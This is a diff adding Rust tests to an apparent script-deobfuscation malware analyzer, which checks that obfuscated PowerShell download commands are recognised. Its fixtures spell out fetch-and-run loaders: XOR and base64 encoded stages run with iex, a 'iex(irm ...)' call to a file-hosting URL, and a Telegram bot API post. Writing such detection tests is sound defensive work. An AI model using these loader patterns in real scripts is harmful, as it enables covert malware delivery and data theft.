@@ -20589,6 +20589,25 @@ mod ps1_url_extraction_tests {
     }
 
     #[test]
+    fn ps_backtick_line_continuation_resolves_cmdlet_name() {
+        let ps =
+            "Invoke-Web`\r\nRequest -Uri \"http://x.example/continued.exe\" -OutFile \"z.exe\"";
+        let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, dst, .. }
+                        if src == "http://x.example/continued.exe" && dst.as_deref() == Some("z.exe")
+                )
+            }),
+            "no Download trait from PS backtick continuation: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn iwr_attached_outfile_preserves_destination() {
         let ps = r#"Invoke-WebRequest -Uri "https://outfile-attached.example/drop.exe" -OutFile:"C:\Users\Public\attached.exe""#;
         let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
@@ -21783,6 +21802,16 @@ mod ps1_obfuscation_tests {
     use crate::traits::Trait;
     use crate::{analyze, Config};
 
+    fn ps_encoded_command(payload: &str) -> String {
+        use base64::Engine;
+
+        let utf16: Vec<u8> = payload
+            .encode_utf16()
+            .flat_map(|u| u.to_le_bytes())
+            .collect();
+        base64::engine::general_purpose::STANDARD.encode(utf16)
+    }
+
     fn hex_filler(count: usize) -> String {
         use std::fmt::Write;
 
@@ -22093,6 +22122,182 @@ Invoke-WebRequest -Uri $url -OutFile $file
             normalized.contains("DOWNLOADSTRING('https://replace.example/p.png')")
                 || normalized.contains("DownloadString('https://replace.example/p.png')"),
             "literal .Replace call not decoded:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
+    fn ps1_ireplace_literal_resolves_url() {
+        let inner =
+            r#"Invoke-WebRequest -Uri ('hxxps://ps-ireplace.example/stage' -ireplace 'xx','tt')"#;
+        let script = format!(
+            "powershell -EncodedCommand {}\r\n",
+            ps_encoded_command(inner)
+        );
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src == "https://ps-ireplace.example/stage")
+            }),
+            "PowerShell -ireplace URL was not deobfuscated: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn ps1_double_quoted_ireplace_literal_resolves_url() {
+        let inner = r#"Invoke-WebRequest -Uri ("hxxps://ps-ireplace-dq.example/stage" -ireplace "xx","tt")"#;
+        let script = format!(
+            "powershell -EncodedCommand {}\r\n",
+            ps_encoded_command(inner)
+        );
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src == "https://ps-ireplace-dq.example/stage")
+            }),
+            "PowerShell double-quoted -ireplace URL was not deobfuscated: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn ps1_double_quoted_replace_literal_resolves_url() {
+        let inner = r#"Invoke-WebRequest -Uri ("hxxps://ps-dot-replace-dq.example/stage".Replace("xx","tt"))"#;
+        let script = format!(
+            "powershell -EncodedCommand {}\r\n",
+            ps_encoded_command(inner)
+        );
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src == "https://ps-dot-replace-dq.example/stage")
+            }),
+            "PowerShell double-quoted literal .Replace URL was not deobfuscated: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn ps1_split_join_literal_resolves_url() {
+        let inner = r#"Invoke-WebRequest -Uri (('h,t,t,p,s,:,/,/,ps-splitjoin.example,/stage' -split ',') -join '')"#;
+        let script = format!(
+            "powershell -EncodedCommand {}\r\n",
+            ps_encoded_command(inner)
+        );
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src == "https://ps-splitjoin.example/stage")
+            }),
+            "PowerShell split/join URL was not deobfuscated: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn ps1_isplit_join_literal_resolves_url() {
+        let inner = r#"Invoke-WebRequest -Uri (('h|t|t|p|s|:|/|/|ps-isplitjoin.example|/stage' -isplit '\|') -join '')"#;
+        let script = format!(
+            "powershell -EncodedCommand {}\r\n",
+            ps_encoded_command(inner)
+        );
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src == "https://ps-isplitjoin.example/stage")
+            }),
+            "PowerShell -isplit/join URL was not deobfuscated: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn ps1_substring_literal_resolves_url() {
+        let inner =
+            r#"Invoke-WebRequest -Uri ('xxhttps://ps-substring.example/stageyy'.Substring(2, 34))"#;
+        let script = format!(
+            "powershell -EncodedCommand {}\r\n",
+            ps_encoded_command(inner)
+        );
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src == "https://ps-substring.example/stage")
+            }),
+            "PowerShell literal Substring URL was not deobfuscated: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn ps1_double_quoted_substring_literal_resolves_url() {
+        let inner = r#"Invoke-WebRequest -Uri ("xxhttps://ps-substring-dq.example/stageyy".Substring(2, 37))"#;
+        let script = format!(
+            "powershell -EncodedCommand {}\r\n",
+            ps_encoded_command(inner)
+        );
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src == "https://ps-substring-dq.example/stage")
+            }),
+            "PowerShell double-quoted literal Substring URL was not deobfuscated: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn ps1_normalization_decodes_replace_cleaned_getstring_base64_variable() {
+        use base64::Engine;
+
+        let decoded = "Invoke-WebRequest -Uri https://b64-var-replace.example/stage.ps1";
+        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
+        let midpoint = b64.len() / 2;
+        let noisy = format!("{}XYZmarker{}", &b64[..midpoint], &b64[midpoint..]);
+        let ps = format!(
+            "$blob = '{noisy}'.Replace('XYZmarker',''); $stage = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($blob)); iex $stage"
+        );
+        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
+
+        assert!(
+            normalized.contains("https://b64-var-replace.example/stage.ps1"),
+            "Replace-cleaned base64 variable script was not decoded:\n{}",
+            normalized
+        );
+        assert!(
+            !normalized.contains("FromBase64String($blob)"),
+            "Replace-cleaned base64 variable GetString call should be replaced:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
+    fn ps1_normalization_does_not_substitute_large_binary_base64_literal() {
+        use base64::Engine;
+
+        let mut binary = b"MZ\x00\x01\x02\x03".to_vec();
+        binary.extend((0..=255).cycle().take(12_000));
+        let b64 = base64::engine::general_purpose::STANDARD.encode(binary);
+        let ps = format!("$buf = [Convert]::FromBase64String('{b64}')");
+        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
+
+        assert!(
+            normalized.contains("FromBase64String"),
+            "large binary base64 literal should not be substituted:\n{}",
+            normalized
+        );
+        assert_eq!(
+            normalized.matches(&b64).count(),
+            1,
+            "large base64 literal should remain a single encoded carrier:\n{}",
             normalized
         );
     }
@@ -23252,6 +23457,157 @@ if ($finalScript -ne $null) {{
         );
     }
 
+    fn assert_file_backed_xor_loader_variant(url: &str, read_expr: &str) {
+        use base64::Engine;
+
+        let payload = format!("Invoke-WebRequest -Uri {url}");
+        let encrypted: Vec<u8> = payload
+            .encode_utf16()
+            .flat_map(|u| u.to_le_bytes())
+            .map(|b| b ^ 253)
+            .collect();
+        let b64 = base64::engine::general_purpose::STANDARD.encode(encrypted);
+        let script = format!(
+            "@echo off\r\necho {b64} > \"%TEMP%\\\\stage.dat\"\r\npowershell -NoP -C \"$k=253;$d={read_expr};$b=[Convert]::FromBase64String($d);$x=0..($b.Length-1)|%{{$b[$_]-bxor$k}};$s=[Text.Encoding]::Unicode.GetString($x);iex $s\"\r\n"
+        );
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .extracted_ps1_normalized
+                .iter()
+                .any(|ps| ps.contains(url)),
+            "file-backed xor stage was not normalized:\n{:?}",
+            report.extracted_ps1_normalized
+        );
+        assert!(
+            report
+                .traits
+                .iter()
+                .any(|t| { matches!(t, Trait::Download { src, .. } if src.contains(url)) }),
+            "file-backed xor stage URL was not extracted: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn ps1_file_backed_base64_xor_loader_resolves_basename_content() {
+        assert_file_backed_xor_loader_variant(
+            "https://xorloader-basename.example/stage.ps1",
+            "(gc 'STAGE.DAT') -join ''",
+        );
+    }
+
+    #[test]
+    fn ps1_file_backed_base64_xor_loader_accepts_get_content_raw() {
+        assert_file_backed_xor_loader_variant(
+            "https://xorloader-raw.example/stage.ps1",
+            "Get-Content -Raw 'STAGE.DAT'",
+        );
+    }
+
+    #[test]
+    fn ps1_file_backed_base64_xor_loader_accepts_get_content_path_raw() {
+        assert_file_backed_xor_loader_variant(
+            "https://xorloader-path-raw.example/stage.ps1",
+            "Get-Content 'STAGE.DAT' -Raw",
+        );
+    }
+
+    #[test]
+    fn ps1_file_backed_base64_xor_loader_accepts_system_convert() {
+        use base64::Engine;
+
+        let url = "https://xorloader-system-convert.example/stage.ps1";
+        let payload = format!("Invoke-WebRequest -Uri {url}");
+        let encrypted: Vec<u8> = payload
+            .encode_utf16()
+            .flat_map(|u| u.to_le_bytes())
+            .map(|b| b ^ 253)
+            .collect();
+        let b64 = base64::engine::general_purpose::STANDARD.encode(encrypted);
+        let script = format!(
+            "@echo off\r\necho {b64} > \"%TEMP%\\\\stage.dat\"\r\npowershell -NoP -C \"$k=253;$d=Get-Content -Raw 'STAGE.DAT';$b=[System.Convert]::FromBase64String($d);$x=0..($b.Length-1)|%{{$b[$_]-bxor$k}};$s=[Text.Encoding]::Unicode.GetString($x);iex $s\"\r\n"
+        );
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .extracted_ps1_normalized
+                .iter()
+                .any(|ps| ps.contains(url)),
+            "System.Convert file-backed xor stage was not normalized:\n{:?}",
+            report.extracted_ps1_normalized
+        );
+        assert!(
+            report
+                .traits
+                .iter()
+                .any(|t| { matches!(t, Trait::Download { src, .. } if src.contains(url)) }),
+            "System.Convert file-backed xor stage URL was not extracted: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn ps1_file_backed_base64_xor_loader_accepts_cat_alias() {
+        assert_file_backed_xor_loader_variant(
+            "https://xorloader-cat-alias.example/stage.ps1",
+            "cat 'STAGE.DAT' -Raw",
+        );
+    }
+
+    #[test]
+    fn ps1_file_backed_base64_xor_loader_accepts_get_content_path_parameter() {
+        assert_file_backed_xor_loader_variant(
+            "https://xorloader-path-parameter.example/stage.ps1",
+            "Get-Content -Path 'STAGE.DAT' -Raw",
+        );
+    }
+
+    #[test]
+    fn ps1_file_backed_base64_xor_loader_accepts_get_content_literal_path_parameter() {
+        assert_file_backed_xor_loader_variant(
+            "https://xorloader-literal-path.example/stage.ps1",
+            "Get-Content -LiteralPath 'STAGE.DAT' -Raw",
+        );
+    }
+
+    #[test]
+    fn ps1_file_backed_base64_xor_loader_resolves_variable_path() {
+        use base64::Engine;
+
+        let url = "https://xorloader-variable-path.example/stage.ps1";
+        let payload = format!("Invoke-WebRequest -Uri {url}");
+        let encrypted: Vec<u8> = payload
+            .encode_utf16()
+            .flat_map(|u| u.to_le_bytes())
+            .map(|b| b ^ 253)
+            .collect();
+        let b64 = base64::engine::general_purpose::STANDARD.encode(encrypted);
+        let script = format!(
+            "@echo off\r\necho {b64} > \"%TEMP%\\\\stage.dat\"\r\npowershell -NoP -C \"$k=253;$p='STAGE.DAT';$d=Get-Content -Raw $p;$b=[Convert]::FromBase64String($d);$x=0..($b.Length-1)|%{{$b[$_]-bxor$k}};$s=[Text.Encoding]::Unicode.GetString($x);iex $s\"\r\n"
+        );
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .extracted_ps1_normalized
+                .iter()
+                .any(|ps| ps.contains(url)),
+            "variable path file-backed xor stage was not normalized:\n{:?}",
+            report.extracted_ps1_normalized
+        );
+        assert!(
+            report
+                .traits
+                .iter()
+                .any(|t| { matches!(t, Trait::Download { src, .. } if src.contains(url)) }),
+            "variable path file-backed xor stage URL was not extracted: {:?}",
+            report.traits
+        );
+    }
+
     #[test]
     fn inline_ps1_xor_base64_function_surfaces_decoded_payload_in_deob() {
         use base64::Engine;
@@ -23799,6 +24155,49 @@ mod ps1_var_substitution_tests {
             report.traits
         );
     }
+
+    #[test]
+    fn ps_braced_variable_interpolation_in_url_resolves() {
+        let inner = r#"$TOKEN = '123:abc'; $TG = "https://api.telegram.org/bot${TOKEN}"; Invoke-RestMethod -Uri "$TG/sendMessage" -Method Post"#;
+        let script = format!("powershell -Command \"{}\"\r\n", inner);
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, .. } if src.contains("api.telegram.org/bot123:abc/sendMessage")
+                )
+            }),
+            "no Download from braced variable URL interpolation: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn ps_outer_command_quotes_do_not_expand_assignment_lhs() {
+        let script = r#"powershell -w h "$u='https://files.catbox.moe/5rvuod.txt';iex(irm $u)""#;
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, .. } if src == "https://files.catbox.moe/5rvuod.txt"
+                )
+            }),
+            "expected clean Download trait: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, .. } | Trait::DownloadInDeobText { src, .. }
+                        if src.contains("5rvuod.txt=")
+                )
+            }),
+            "assignment LHS was expanded into a bogus URL: {:?}",
+            report.traits
+        );
+    }
 }
 
 #[cfg(test)]
@@ -23847,6 +24246,23 @@ mod ps_replace_join_tests {
         assert!(
             has,
             "no Download after double-quoted -join: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn ps_array_subexpression_variable_join_resolves() {
+        let inner = r#"$p=@('https://','ps-array-var.example','/stage');$u=$p -join '';Invoke-WebRequest $u"#;
+        let script = format!("powershell -Command \"{}\"\r\n", inner);
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, .. } if src.contains("https://ps-array-var.example/stage")
+                )
+            }),
+            "no Download after @() array variable join: {:?}",
             report.traits
         );
     }
